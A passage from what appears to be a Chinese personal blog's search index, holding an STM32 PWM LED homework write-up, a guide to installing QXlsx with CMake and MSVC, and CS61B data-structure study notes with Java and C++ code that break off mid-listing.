HAL_TIM_Base_Start_IT(&amp;htim4);     HAL_NVIC_SetPriority(TIM4_IRQn, 1, 0);     HAL_NVIC_EnableIRQ(TIM4_IRQn); }  void LED_SetRGB(uint16_t r, uint16_t g, uint16_t b) {     const uint16_t ARR = __HAL_TIM_GET_AUTORELOAD(&amp;htim3);      if (r &gt; ARR) r = ARR;     if (g &gt; ARR) g = ARR;     if (b &gt; ARR) b = ARR;      __HAL_TIM_SET_COMPARE(&amp;htim3, TIM_CHANNEL_2, r); // R -&gt; PB5     __HAL_TIM_SET_COMPARE(&amp;htim3, TIM_CHANNEL_3, g); // G -&gt; PB0     __HAL_TIM_SET_COMPARE(&amp;htim3, TIM_CHANNEL_4, b); // B -&gt; PB1 }  /* ==========================================================================  * 作业5：七彩灯（1s 切换，红→橙→黄→绿→青→蓝→紫）  * ========================================================================== */ static uint8_t rainbow_state = 0;  void Rainbow_Init(void) {     TIM4_Base_Init(999, 7999);  // 1s 节拍     rainbow_state = 0;     g_mode = MODE_RAINBOW; }  static void Rainbow_Update(void) {     const uint16_t ARR = __HAL_TIM_GET_AUTORELOAD(&amp;htim3);      switch (rainbow_state)     {         case 0: LED_SetRGB(ARR,   0,   0); break;        // 红         case 1: LED_SetRGB(ARR, ARR/2, 0); break;        // 橙 = 红 + 半绿         case 2: LED_SetRGB(ARR, ARR,   0); break;        // 黄 = 红 + 绿         case 3: LED_SetRGB(  0, ARR,   0); break;        // 绿         case 4: LED_SetRGB(  0, ARR, ARR); break;        // 青 = 绿 + 蓝         case 5: LED_SetRGB(  0,   0, ARR); break;        // 蓝         case 6: LED_SetRGB(ARR,   0, ARR); break;        // 紫 = 红 + 蓝     }     rainbow_state = (rainbow_state + 1) % 7; }  之后进行编译和烧录即可。  作业-呼吸灯 作业内容：使用相应软件操作STM32开发板，产生4彩（红、绿、蓝、白）呼吸灯，呼吸周期为1.x秒（x为学号尾数），CCR更新周期不高于0.2s。  呼吸灯的核心是占空比的周期性变化。首先回顾PWM的内容。PWM 是 Pulse Width Modulation（脉冲宽度调制）的缩写，是一种通过改变脉冲信号的高电平持续时间与周期的比例，来模拟信号效果的数字控制技术。STM32 的定时器，如TIM3，可硬件生成高精度 PWM 信号，无需 CPU 持续干预。对 LED 来说，在频率足够高的情况下，人眼会因为视觉暂留把高频闪烁看作持续的光。TIMx作为PWM的时基有频率公式： \\(f_{PWM} = \\frac{f_{TIMCLK}}{(PSC+1) \\times (ARR+1)}\\)  其中ARR为自动重装载寄存器，决定周期长度，即计数上限；PSC为预分频器，决定计数节拍变慢多少；CRR是捕获/比较寄存器，对应占空比。因而只需让CCR随着时间先增再减就能实现呼吸效果。本文采用余弦函数产生更平滑的呼吸效果： \\(duty(t) = \\frac{1-\\cos{(\\frac{2\\pi t}{T}})}{2}\\)  其中duty∈[0,1]，T为呼吸周期。 之后设置两个计时器，按照作业5的形式定义TIM3和TIM4的行为，这里不再赘述。 最终在上一节代码之后追加： #define BREATH_PERIOD 1.5f #define BREATH_DT     0.1f  static uint16_t breath_step  = 0; static uint8_t  breath_color = 0;  void Breath_Init(void) {     TIM4_Base_Init(99, 7999);  // 0.1s 节拍     breath_step  = 0;     breath_color = 0;     g_mode = MODE_BREATH; }  static void Breath_Update(void) {     const uint16_t ARR = __HAL_TIM_GET_AUTORELOAD(&amp;htim3);     const uint16_t steps_per_cycle = (uint16_t)(BREATH_PERIOD / BREATH_DT); // 例如1.5/0.1=15      float x    = (float)breath_step / (float)steps_per_cycle;       // 0..1     float duty = (1.0f - cosf(2.0f * (float)M_PI * x)) * 0.5f;      // 余弦曲线 0..1     uint16_t v = (uint16_t)(duty * ARR);      switch (breath_color)     {         case 0: LED_SetRGB(v, 0, 0);           break;  // 红         case 1: LED_SetRGB(0, v, 0);           break;  // 绿         case 2: LED_SetRGB(0, 0, v);           break;  // 蓝         case 3: LED_SetRGB(v, v, v);           break;  // 白         default: break;     }      breath_step++;     if (breath_step &gt;= steps_per_cycle)     {         breath_step  = 0;         breath_color = (breath_color + 1) % 4; // 红→绿→蓝→白     } }"
  },
  
  {
    "title": "Qt6.7.3（MSVC2022）安装外部库QXlsx",
    "url": "/posts/qt-qxlsx/",
    "categories": "Coding",
    "tags": "qt, qmake, msvc",
    "date": "2025-08-30 22:27:00 +0800",
    "content": "为了解决书院填综测的烦人问题，我决定使用比较熟悉的Qt框架编写一套自动填写综测的程序。其中涉及到读取xlsx文件，这就要用到外部的库。没想到装这个库踩了这么多坑，写个博客记录一下。学习CMake已经不得不提上日程了。  安装QXlsx库  Qt 6.7.3 (MSVC  2022 64-bit)  git clone https://github.com/QtExcel/QXlsx.git                  由于我们使用MSVC，可以参考官网（[使用 cmake       QXlsx](https://qtexcel.github.io/QXlsx/HowToSetProject-cmake.zh-CN.html)）的构建方式，但不能完全照搬。           使用管理员权限启动Qt 6.7.3 (MSVC  2022 64-bit)的终端（位于...\\Qt\\6.7.3\\msvc2022_64\\bin\\qtenv2.bat，在【开始】界面搜索qt即可）  此时我们应当先将目录调整到./QXlsx下，之后：  mkdir build cd build   接下来进行配置构建和安装参数，这与官网的教程有些许不同：  cmake ../QXlsx/ -DCMAKE_INSTALL_PREFIX=E:/ProgramFile/CodingLibs/QXlsx/install_msvc2022_release   其中-DCMAKE_INSTALL_PREFIX=...是设定库的安装根目录，一般都会放到项目名称/install下。  官网的教程中给出有另一个参数-DCMAKE_BUILD_TYPE=Release仅对单配置生成器（如 Makefile、Ninja）有效，对于 Visual Studio 这种多配置生成器，实际构建类型由--config参数在构建阶段指定，所以在此处不需要填写。  接下来进行构建：  cmake --build . --config Release   这里与官网不同的就是多了参数--config Release，这与上文阐述的原理相同。  接下来进行安装：  cmake --install . --config Release   接下来展示完整的命令行：  Setting up environment for Qt usage... Remember to call vcvarsall.bat to complete environment setup!  E:\\ProgramFile\\Qt\\6.7.3\\msvc2022_64&gt;cd ../../../CodingLibs/QXlsx  E:\\ProgramFile\\CodingLibs\\QXlsx&gt;mkdir build  E:\\ProgramFile\\CodingLibs\\QXlsx&gt;cd build  E:\\ProgramFile\\CodingLibs\\QXlsx\\build&gt;cmake ../QXlsx/ -DCMAKE_INSTALL_PREFIX=E:/ProgramFile/CodingLibs/QXlsx/install #这里不是install_msvc2022_release是因为仅作展示 -- Building for: Visual Studio 17 2022 -- Selecting Windows SDK version 10.0.22621.0 to target Windows 10.0.22631. -- The CXX compiler identification is MSVC 19.42.34435.0 -- Detecting CXX compiler ABI info -- Detecting CXX compiler ABI info - done -- Check for working CXX compiler: C:/Program Files/Microsoft Visual Studio/2022/Community/VC/Tools/MSVC/14.42.34433/bin/Hostx64/x64/cl.exe - skipped -- Detecting CXX compile features -- Detecting CXX compile features - done -- Performing Test CMAKE_HAVE_LIBC_PTHREAD -- Performing Test CMAKE_HAVE_LIBC_PTHREAD - Failed -- Looking for pthread_create in pthreads -- Looking for pthread_create in pthreads - not found -- Looking for pthread_create in pthread -- Looking for pthread_create in pthread - not found -- Found Threads: TRUE -- Performing Test HAVE_STDATOMIC -- Performing Test HAVE_STDATOMIC - Success -- Found WrapAtomic: TRUE -- Could NOT find WrapVulkanHeaders (missing: Vulkan_INCLUDE_DIR) -- Configuring done (5.1s) -- Generating done (0.2s) -- Build files have been written to: E:/ProgramFile/CodingLibs/QXlsx/build  E:\\ProgramFile\\CodingLibs\\QXlsx\\build&gt;cmake --build . --config Release 适用于 .NET Framework MSBuild 版本 17.12.12+1cce77968    1&gt;Checking Build System   Automatic MOC for target QXlsx   Building Custom Rule E:/ProgramFile/CodingLibs/QXlsx/QXlsx/CMakeLists.txt   xlsxcellrange.cpp   xlsxcontenttypes.cpp   xlsxdrawinganchor.cpp   xlsxrichstring.cpp   xlsxworkbook.cpp   xlsxabstractooxmlfile.cpp   xlsxcellreference.cpp   xlsxdatavalidation.cpp   xlsxdrawing.cpp   xlsxsharedstrings.cpp   xlsxworksheet.cpp   xlsxabstractsheet.cpp   xlsxchart.cpp   xlsxdatetype.cpp   xlsxformat.cpp   xlsxsimpleooxmlfile.cpp   xlsxzipreader.cpp   xlsxcell.cpp   xlsxchartsheet.cpp   xlsxdocpropsapp.cpp   正在生成代码...   正在编译...   xlsxmediafile.cpp   xlsxstyles.cpp   xlsxzipwriter.cpp   xlsxcellformula.cpp   xlsxcolor.cpp   xlsxdocpropscore.cpp   xlsxnumformatparser.cpp   xlsxtheme.cpp   xlsxcelllocation.cpp   xlsxconditionalformatting.cpp   xlsxdocument.cpp   xlsxrelationships.cpp   xlsxutility.cpp   mocs_compilation_Release.cpp   正在生成代码...   QXlsx.vcxproj -&gt; E:\\ProgramFile\\CodingLibs\\QXlsx\\build\\Release\\QXlsxQt6.lib   Building Custom Rule E:/ProgramFile/CodingLibs/QXlsx/QXlsx/CMakeLists.txt  E:\\ProgramFile\\CodingLibs\\QXlsx\\build&gt;cmake --install . --config Release -- Installing: E:/ProgramFile/CodingLibs/QXlsx/install/lib/QXlsxQt6.lib -- Installing: E:/ProgramFile/CodingLibs/QXlsx/install/include/QXlsxQt6/xlsxabstractooxmlfile.h -- Installing: E:/ProgramFile/CodingLibs/QXlsx/install/include/QXlsxQt6/xlsxabstractsheet.h -- Installing: E:/ProgramFile/CodingLibs/QXlsx/install/include/QXlsxQt6/xlsxabstractsheet_p.h -- Installing: E:/ProgramFile/CodingLibs/QXlsx/install/include/QXlsxQt6/xlsxcellformula.h -- Installing: E:/ProgramFile/CodingLibs/QXlsx/install/include/QXlsxQt6/xlsxcell.h -- Installing: E:/ProgramFile/CodingLibs/QXlsx/install/include/QXlsxQt6/xlsxcelllocation.h -- Installing: E:/ProgramFile/CodingLibs/QXlsx/install/include/QXlsxQt6/xlsxcellrange.h -- Installing: E:/ProgramFile/CodingLibs/QXlsx/install/include/QXlsxQt6/xlsxcellreference.h -- Installing: E:/ProgramFile/CodingLibs/QXlsx/install/include/QXlsxQt6/xlsxchart.h -- Installing: E:/ProgramFile/CodingLibs/QXlsx/install/include/QXlsxQt6/xlsxchartsheet.h -- Installing: E:/ProgramFile/CodingLibs/QXlsx/install/include/QXlsxQt6/xlsxconditionalformatting.h -- Installing: E:/ProgramFile/CodingLibs/QXlsx/install/include/QXlsxQt6/xlsxdatavalidation.h -- Installing: E:/ProgramFile/CodingLibs/QXlsx/install/include/QXlsxQt6/xlsxdatetype.h -- Installing: E:/ProgramFile/CodingLibs/QXlsx/install/include/QXlsxQt6/xlsxdocument.h -- Installing: E:/ProgramFile/CodingLibs/QXlsx/install/include/QXlsxQt6/xlsxformat.h -- Installing: E:/ProgramFile/CodingLibs/QXlsx/install/include/QXlsxQt6/xlsxglobal.h -- Installing: E:/ProgramFile/CodingLibs/QXlsx/install/include/QXlsxQt6/xlsxrichstring.h -- Installing: E:/ProgramFile/CodingLibs/QXlsx/install/include/QXlsxQt6/xlsxworkbook.h -- Installing: E:/ProgramFile/CodingLibs/QXlsx/install/include/QXlsxQt6/xlsxworksheet.h -- Installing: E:/ProgramFile/CodingLibs/QXlsx/install/lib/cmake/QXlsxQt6/QXlsxQt6Targets.cmake -- Installing: E:/ProgramFile/CodingLibs/QXlsx/install/lib/cmake/QXlsxQt6/QXlsxQt6Targets-release.cmake -- Installing: E:/ProgramFile/CodingLibs/QXlsx/install/lib/cmake/QXlsxQt6/QXlsxQt6Config.cmake -- Installing: E:/ProgramFile/CodingLibs/QXlsx/install/lib/cmake/QXlsxQt6/QXlsxQt6ConfigVersion.cmake   为了能够在调试的时候使用，还需要重复上述过程，安装一遍Debug版！  使用QXlsx库  在项目的CMakeLists.txt添加如下代码：  cmake_minimum_required(VERSION 3.16)  project(StdEvalGoPre VERSION 0.1 LANGUAGES CXX)  set(CMAKE_AUTOUIC ON) set(CMAKE_AUTOMOC ON) set(CMAKE_AUTORCC ON)  set(CMAKE_CXX_STANDARD 17) set(CMAKE_CXX_STANDARD_REQUIRED ON)  # &gt;&gt;&gt; 查找Qt库 find_package(QT NAMES Qt6 Qt5 REQUIRED COMPONENTS Widgets) find_package(Qt${QT_VERSION_MAJOR} REQUIRED COMPONENTS Widgets)  # &gt;&gt;&gt; 设置QXlsx的安装路径（替换为实际安装路径） if(CMAKE_BUILD_TYPE STREQUAL \"Debug\")     set(QXLSX_INSTALL_PATH \"E:/ProgramFile/CodingLibs/QXlsx/install_msvc2022_debug\") else()     set(QXLSX_INSTALL_PATH \"E:/ProgramFile/CodingLibs/QXlsx/install_msvc2022_release\") endif()  # &gt;&gt;&gt; 将QXlsx的安装路径添加到CMake的搜索路径 list(APPEND CMAKE_PREFIX_PATH ${QXLSX_INSTALL_PATH})  # &gt;&gt;&gt; 查找QXlsx库（根据使用的Qt版本选择） if(${QT_VERSION_MAJOR} EQUAL 6)     find_package(QXlsxQt6 REQUIRED) else()     find_package(QXlsxQt5 REQUIRED) endif()  set(PROJECT_SOURCES         main.cpp         mainwindow.cpp         mainwindow.h         mainwindow.ui         util/excelreader.cpp         util/excelreader.h )  if(${QT_VERSION_MAJOR} GREATER_EQUAL 6)     qt_add_executable(StdEvalGoPre         MANUAL_FINALIZATION         ${PROJECT_SOURCES}     ) else()     if(ANDROID)         add_library(StdEvalGoPre SHARED             ${PROJECT_SOURCES}         )     else()         add_executable(StdEvalGoPre             ${PROJECT_SOURCES}         )     endif() endif()  # &gt;&gt;&gt; 链接库（添加QXlsx的链接） target_link_libraries(StdEvalGoPre PRIVATE     Qt${QT_VERSION_MAJOR}::Widgets     QXlsx::QXlsx  # 添加QXlsx链接 )  if(${QT_VERSION} VERSION_LESS 6.1.0)   set(BUNDLE_ID_OPTION MACOSX_BUNDLE_GUI_IDENTIFIER com.example.StdEvalGoPre) endif() set_target_properties(StdEvalGoPre PROPERTIES     ${BUNDLE_ID_OPTION}     MACOSX_BUNDLE_BUNDLE_VERSION ${PROJECT_VERSION}     MACOSX_BUNDLE_SHORT_VERSION_STRING ${PROJECT_VERSION_MAJOR}.${PROJECT_VERSION_MINOR}     MACOSX_BUNDLE TRUE     WIN32_EXECUTABLE TRUE )  include(GNUInstallDirs) install(TARGETS StdEvalGoPre     BUNDLE DESTINATION .     LIBRARY DESTINATION ${CMAKE_INSTALL_LIBDIR}     RUNTIME DESTINATION ${CMAKE_INSTALL_BINDIR} )  if(QT_VERSION_MAJOR EQUAL 6)     qt_finalize_executable(StdEvalGoPre) endif()"
  },
  
  {
    "title": "UCB CS61B学习笔记",
    "url": "/posts/CS61B/",
    "categories": "Coding",
    "tags": "computer science, algorithm, java",
    "date": "2025-07-10 22:14:00 +0800",
    "content": "UCB CS61B 学习笔记  写在前面  Java是我接触的第一门编程语言，磕磕绊绊的学习也收获了不少。最早跟随尚硅谷2014年免费课进行学习，虽然最终学习进度停在了泛型等其他高级类特性，但是受到这么多年在计算机世界的熏陶后，对编程语言还是有了比较深入的了解，因而本笔记不再按照lecture分节，仅记录我认为是重点或者有趣、有用的东西（当然还是大体上按照课程顺序）  实际上这门课叫《算法与数据结构》，编程语言只是实现方法，不是最终目的，因而不必在这上面纠结过多。  课程的作业依赖org.junit.jupiter和com.google.common.truth，其中com.google.common.truth还依赖com.google.common.guava，所以需要导入外部库文件。  在File/Project Structure/Project Settings/Modules，选择添加JAR即可。  Maven Repository: com.google.guava » guava » 33.3.0-jre  Maven Repository: com.google.truth » truth » 1.4.4  数据类型  Java的数据类型可以分为基本数据类型和引用数据类型，其中基本数据类型有八种byte,short,int,long,char,boolean,float,double，它们栈内存中直接存储数据值，有明确的默认值（如int默认 0，boolean默认false）且固定大小。  而引用数据类型存储对象的引用（内存地址），而非对象本身，变量在栈内存中存储引用，对象本身在堆内存中，默认值为null，表示不指向任何对象，引用本身大小固定（通常为 32/64 位），但对象大小不定。  这在C/C++与Java中存在区别。  public class People{     public int age;     private String name;          public People(int age,String name){         this.age = age;         this.name = name;     } }  public class Main{     public static void main(String args[]){         People p1 = new People(18,\"Tom\");         People p2 = p1;         p2.age = 10;         System.out.println(p1.age);     } }    上述Java代码的执行结果应该是10而不是18，因为p2和p1共享一个内存空间。在C/C++中：  class Point { public:     int x, y; };  int main() {     Point p1{10, 20};     Point p2 = p1;  // 值传递：复制p1的所有成员到p2     p2.x = 100;     // p1.x仍为10，p2.x为100（内存独立） }   #include &lt;stdio.h&gt;  typedef struct {     int x;     int y; } Point;  int main() {     Point p1 = {10, 20};     Point p2 = p1;  // 值传递：复制p1的内容到p2      p2.x = 100;     // 修改p2的成员      printf(\"p1.x = %d, p1.y = %d\\n\", p1.x, p1.y);  // 输出: p1.x = 10, p1.y = 20     printf(\"p2.x = %d, p2.y = %d\\n\", p2.x, p2.y);  // 输出: p2.x = 100, p2.y = 20     return 0; }   在C/C++中需要自定义行为来实现深拷贝或引用传递。  需要注意的是，数组在Java中也不是基本数据类型，因而数组也需要实例化对象，这表明Java的数组是存在堆中的。这与C/C++有显著差异，在C/C++中，一般的数组是存在栈上的，若需要存在堆上，则需要自己分配内存并回收内存。  因而可以这么认为，在Java中，new关键字相当于申请内存，相当于malloc()，除了基本数据类型以外，所有的数据类型都是指针。  数据结构  二叉搜索树（Binary Search Tree）  二叉搜索树是一种将有序数组以大小关系转换为二叉树的数据结构，确保每个节点的左子树的任何值都小于该节点、每个节点的右子树的任何值都大于该节点。  在二叉搜索树（BST）中删除节点时，需要保证删除后树仍然保持 BST 的性质，删除操作的复杂度在于需要处理三种不同情况，下面我将详细解释。  假设我们要删除的节点为N：          节点N没有子节点（叶子节点）      直接删除该节点，将其父节点的对应指针置为null。      原树：     5    / \\   3   7  / 2     删除后：     5    / \\   2   7                节点N只有一个子节点      用子节点替换N的位置，即让父节点直接指向N的子节点。      原树：     5    / \\   3   7  / 2     删除后：     5    / \\   2   7                节点N有两个子节点      需要找到N的 中序后继节点（Inorder Successor） 或 中序前驱节点（Inorder Predecessor） 来替换N。其中中序后继指的是右子树中的最小节点（即右子树的最左节点）；而中序前驱指的是左子树中的最大节点（即左子树的最右节点）。通常选择中序后继进行替换，因为实现更简单。替换后，原后继节点的位置需要递归调整（通常是删除原后继节点，因为它一定没有左子节点）。      原树：     5    / \\   3   7  / \\ / \\ 2  4 6  8     中序后继是6（右子树的最小节点），用6替换5：     6    / \\   3   7  / \\   \\ 2  4    8           Java实现：  class BST{     private static class Node {         int data;         Node left, right;          public Node(int data,Node left,Node right){             this.data = data;             this.left = left;             this.right = right;         }          public int Data(){return this.data;}         public Node Left(){return this.left;}         public Node Right(){return this.right;}     }     private Node root = null;     private Node buildTree(int lpos, int rpos, int[] arr){         if(lpos &gt; rpos)return null;          int mid = lpos + (rpos - lpos) / 2;          Node curr = new Node(arr[mid], null, null);          curr.left = buildTree(lpos, mid - 1, arr);         curr.right = buildTree(mid + 1, rpos, arr);          return curr;     }     /** return the max node of the right subtree */     private Node findMin(Node N){         while(N.left != null) N = N.left;         return N;     }     private Node BSTinsert(Node N,int val){         if(N==null){             return new Node(val, null, null);         }          if(val &lt; N.Data()){             N.left = BSTinsert(N.left,val);         }else if(val &gt; N.Data()){             N.right = BSTinsert(N.right,val);         }          return N;     }     private Node BSTdelete(Node N, int val){         if(N == null){             return null;         }          if(val &lt; N.Data()){             N.left = BSTdelete(N.left, val);         }else if(val &gt; N.Data()){             N.right = BSTdelete(N.right, val);         }else{             //no child or only have one child             if(N.left == null) return N.right;             if(N.right == null) return N.left;              //have two child             Node tmp = findMin(N.right);             N.data = tmp.data;             N.right = BSTdelete(N.right, tmp.data);         }          return N;     }     /** The constructor of Binary Search Tree      *      * need a no-sorted array, because the constructor has      * already sorted the array      **/     public BST(int[] arr){         Arrays.sort(arr);         int len = arr.length;         int mid = len/2;         root = buildTree(0, len-1, arr);     }      public void insert(int val){         root = BSTinsert(root,val);     }      public void delete(int val){         root = BSTdelete(root,val);     }      public void inorderTraversal(){      } }   B树（B-tree）  B树是一种自平衡的搜索树，被广泛应用于索引和搜索操作。平衡树是指任意节点的左子树和右子树的高度差（平衡因子）的绝对值不超过1的树。B树不是二叉树而是多叉树，常见的B树有2-3树（2-3 tree）和2-3-4树（2-3-4 tree）。  2-3树是最简单的B树，是指每个节点最多有2个数据，每个节点最多有3个子节点。2-3-4树是指每个节点最多有四个字节点和三个数据项，可以理解为非叶节点的子节点数总是比它含有的数据项多1。如果子节点个数为L，数据项个数为D，那么满足关系L = D + 1。  红黑树（Red-Black Tree）  红黑树实际上是B树的变体。2-3树等价于左旋红黑树（LLRB），2-3-4树等价于红黑树。红黑树每个节点只有一个数据，由B树转换为红黑树时，需要将B树中多数据节点拆开，产生红边（以区别B树中正常连接的黑边）。  红黑树（图解+秒懂+史上最全） - 技术自由圈 - 博客园一文很好的介绍了这个数据结构。  高阶数据结构：红黑树原理与代码实现 - 知乎一文介绍了红黑树的C++实现。  由于个人能力有限，暂时无法复现B树与红黑树的代码，本部分等待后续更新。  哈希表（Hash Table）  Hash主要用于信息安全领域中加密算法，它把一些不同长度的信息转化成杂乱的128位的编码，这些编码值叫做Hash值。也可以说，Hash就是找到一种数据内容和数据存放地址之间的映射关系。  哈希表本质是一个数组，数组存储着指针，指向一个链表。当一个数据产生哈希值后，便会被插入这个数组中，其索引为哈希值。然而，两个不同的数据可能产生相同的哈希值，为了解决哈希碰撞的问题，在每一个数组索引对应的值上插入一个指针指向链表，链表依次向后搜索或者插入数据，相同哈希值的数据被存入链表。  public class HashTable{     //定义节点，数据以int为例 \tprivate static class Node{         Node next;         int key;         int val;                  public Node(Node next,int key,int val){             this.next = next;             this.val = val;             this.key = key;         }     }          //以长度为10举例     private Node[] list;          public HashTable(){         list = new Node[10];     }          public int search(int key){         int index = ???.gethash(key);         Node curr = list[index];         while(curr != null){             if(curr.key == key){                 return val;             }             curr = curr.next;         }         return 0;     }          public void insert(int key,int val){         int index = ???.gethash(key);         Node curr = list[index];         while(curr != null){             if(curr.key == key){                 curr.val = val;             }             curr = curr.next;         }         Node tmp = new Node(null,key,val);         tmp.next = list[index];         list[index] = tmp;     }  }   Java 【数据结构】 哈希（Hash超详解）HashSet&amp;HashMap【神装】_java hash-CSDN博客一文详细介绍了哈希表（Hash Table，又称哈希桶，Hash Basket）和HashSet与HashMap  堆（Heap）  堆（Heap）是一类特殊的数据结构，通常用于实现优先级队列。堆通常是一个可以被看做一棵树的数组对象。堆可以看作是一棵完全二叉树的数组对象，具有以下两个主要性质：     堆中某个节点的值总是不大于或不小于其父节点的值。   堆总是一棵完全二叉树。   根据根节点的值，堆可以分为最大堆（大根堆）和最小堆（小根堆）。在最大堆中，根节点的值是所有节点中最大的；在最小堆中，根节点的值是所有节点中最小的  以下是小根堆的基础实现：  public class Heap {     private int keys[];     private int size = 100;     private int index = 0;      public Heap() {         keys = new int[size + 1];     }      public int getKey(int index) {         return keys[index];     }      public int top(){         return keys[1];     }      private void swap(int i, int j) {         int temp = keys[i];         keys[i] = keys[j];         keys[j] = temp;     }      public void swim(int pos) {         if (pos == 1) return;         if (keys[pos] &lt; keys[pos / 2]) {             swap(pos, pos / 2);             swim(pos / 2);         }     }       public void insert(int key) {         keys[++index] = key;         swim(index);     }      public void deleteMin() {         keys[1] = keys[index--];         int pos = 1;         while (index &gt;= 2 * pos) {             int j  = 2 * pos;             if(j &lt; index &amp;&amp; keys[j] &gt; keys[j + 1]) j++;             if(keys[j] &gt;= keys[pos]) break;             swap(j, pos);             pos = j;         }     } }   优先队列（Priority Queue）  是一种抽象数据类型（ADT），定义了一组操作（如插入元素、取出优先级最高的元素等），核心特性是每次取出的元素都是当前队列中优先级最高的（具体优先级由规则定义，如数值大小、自定义比较器等）。如果用小根堆实现优先队列，则可以实现最小值优先的优先队列。  算法  树的遍历（Tree Travelers）  树的遍历分为前序（PreOrder）、中序（InOrder）、后序（PostOrder）遍历。前序遍历按照根节点 → 左子树 → ··· → 右子树的顺序遍历，广泛出现于各种递归、暴力搜索的过程中。中序遍历按照左子树 → 根节点 → 右子树的顺序遍历，特别地，对于二叉搜索树，中序遍历结果是升序序列。后序遍历按照左子树 → 右子树 → 根节点，常用于删除树节点，以确保先删除子节点，再删除根节点。  void preorder(TreeNode root) {     if (root == null) return;     System.out.print(root.val + \" \"); // 访问根     preorder(root.left);              // 遍历左     preorder(root.right);             // 遍历右 }  void inorder(TreeNode root) {     if (root == null) return;     inorder(root.left);               // 遍历左     System.out.print(root.val + \" \"); // 访问根     inorder(root.right);              // 遍历右 }  void postorder(TreeNode root) {     if (root == null) return;     postorder(root.left);              // 遍历左     postorder(root.right);             // 遍历右     System.out.print(root.val + \" \");  // 访问根 }   图的存储  树是特殊的图。对于一般的图，一般有三种存储方式：  邻接矩阵（Adjacency Matrix）  使用二维数组表示图中节点之间的连接关系。适用于稠密图（边数接近节点数的平方）。     二维数组 matrix[i][j] 表示节点 i 到 j 是否有边   对于无权图，matrix[i][j] = 1 表示有边，0 表示无边   对于有权图，matrix[i][j] 存储边的权重，∞ 表示无边   复杂度分析：     空间复杂度：O (V²)，V 为顶点数   添加边：O(1)   判断两节点是否相邻：O(1)   遍历所有边：O(V²)   邻接表（Adjacency List）  使用链表数组表示每个节点的邻接节点。适用于稀疏图（边数远小于节点数的平方）。     数组 adj 存储每个节点的邻接表   adj[i] 是一个链表，包含所有从节点 i 出发的边的终点   对于有权图，链表节点还需存储边的权重   复杂度分析：     空间复杂度：O (V+E)，V 为顶点数，E 为边数   添加边：O(1)   判断两节点是否相邻：O (E/V)（平均情况）   遍历所有边：O(V+E)   import java.util.*;  public class AdjacencyListGraph {     private int numVertices;     private LinkedList&lt;Integer&gt;[] adj; // 无边权邻接表数组          // 初始化     public AdjacencyListGraph(int vertices) {         this.numVertices = vertices;         adj = new LinkedList[vertices];         for (int i = 0; i &lt; vertices; i++) {             adj[i] = new LinkedList&lt;&gt;();         }     }          // 添加边（无权图）     public void addEdge(int src, int dest) {         adj[src].add(dest);     }          // 有权图边的定义     static class Edge {         int dest;         int weight;         public Edge(int dest, int weight) {             this.dest = dest;             this.weight = weight;         }     }          private LinkedList&lt;Edge&gt;[] weightedAdj; // 带权邻接表          // 加有权边     public void addWeightedEdge(int from, int dest, int weight) {         weightedAdj[from].add(new Edge(dest, weight));     }      }   链式前向星（Linked Forward Star）  国人发明的数据结构，十分好用。链式前向星是一种高效存储图的数据结构，结合了邻接表和数组的优势，适合处理大规模稀疏图。它通过静态数组模拟链表，避免了频繁内存分配的开销，广泛应用于图论算法。     边的结构：            to：边的终点       next：同起点的下一条边的索引（通过head数组连接同起点的所有边）       weight：边的权重           头数组 head：            head[u] 存储顶点u的第一条边的索引       初始化为 -1，表示没有出边           添加边的顺序：            新边总是插入到链表头部（类似栈的 LIFO）       例如，依次添加边 u→v1, u→v2, u→v3，链表顺序为 v3 → v2 → v1           复杂度分析     空间复杂度：O (V + E)，V 为顶点数，E 为边数   添加边：O(1)   遍历某个顶点的所有出边：O (该顶点的出度)   遍历所有边：O(E)   struct edge{ \tint to,len,nxt;     // to 边的终点     // len 边的长度，即权重     // nxt 同起点下一条边的索引 }edge[MAXN];  int head[MAXN],cnt; // head[u] 存储顶点u的第一条边的索引 // cnt 总边数，为最后一条边的索引  void add(int x,int y,int z){     cnt++;// 更新索引     edge[cnt].to = y;      edge[cnt].len = z;     edge[cnt].nxt = head[x];     head[x] = cnt;// 更新头 }   图的遍历（Map Travelers）  由于图可能存在环，在遍历时需要一个数组显式地记忆该节点是否被访问过。如果使用深度优先搜索，可以使用递归。  bool vis[MAXN];  void DFS(int now){     vis[now] = TRUE;     printf(now);     for(now可到达的边 = i){         if(vis[i] == FALSE){             DFS(i);         }     } }   也可以使用广度优先搜索，二者的区别是前者需要用到栈（先进后出，以确保一直先搜索第一条路径直到头），后者需要队列（先进先出，以确保一直搜索上一级节点能到达的所有节点）。由于调用递归时，用到了内存的栈结构，所以不需要在自行定义一个栈进行使用。而在广度优先搜索中，没有可以使用的抽象硬件结构，所以需要显式定义队列这一数据类型。  public class BFS {     public void bfs(Graph graph, int start) {         boolean[] visited = new boolean[graph.getV()];         Queue&lt;Integer&gt; queue = new LinkedList&lt;&gt;();          // 起始顶点入队并标记访问         queue.add(start);         visited[start] = true;          while (!queue.isEmpty()) {             int v = queue.poll();             System.out.print(v + \" \");              // 将未访问的邻接顶点入队             for (int neighbor : graph.getAdj().get(v)) {                 if (!visited[neighbor]) {                     visited[neighbor] = true;                     queue.add(neighbor);                 }             }         }     } }    单源最短路算法  在图论中，单源最短路算法用于求解从一个固定起点（源点）到图中所有其他顶点的最短路径。  Dijkstra 算法  图中无负权边（可含非负权边，有向图 / 无向图均可）时使用，时间复杂度较低，适合稠密图或稀疏图。该算法使用贪心策略，每次从 “未确定最短路径的顶点” 中选择距离源点最近的顶点，确定其最短路径，同时有“松弛操作”，以该顶点为中介，更新其他顶点到源点的距离。  要实现该算法，初始化时首先定义源点距离为 0，其他顶点距离为∞，标记所有顶点为 “未访问”，然后重复以下操作，直到所有顶点被访问：     选择距离源点最近的 “未访问” 顶点u，标记为 “已访问”。   对u的所有邻接顶点v，若distance[v] &gt; distance[u] + weight(u, v)，则更新distance[v]。   朴素实现下（邻接矩阵 + 线性查找）：O(n²)（n 为顶点数），优化实现下（邻接表 + 优先队列）：O(m log n)（m 为边数），适用于稀疏图。  #include &lt;vector&gt; #include &lt;queue&gt; #include &lt;cstring&gt; using namespace std;  namespace Dijkstra {     const int MAXN = 1e5 + 5;  // 最大顶点数     typedef long long LL;      // 防止距离溢出          struct Edge {         int to;        // 终点         int weight;    // 边权         int next;      // 同起点的下一条边的索引     } edges[MAXN * 2]; // 边表（无向图需双倍空间）      LL dist[MAXN];      // 源点到各点的最短距离     int head[MAXN];     // 每个顶点的第一条边的索引     int edgeCount;      // 边计数器      // 小根堆：存储{距离, 顶点}对     priority_queue&lt;pair&lt;LL, int&gt;, vector&lt;pair&lt;LL, int&gt;&gt;, 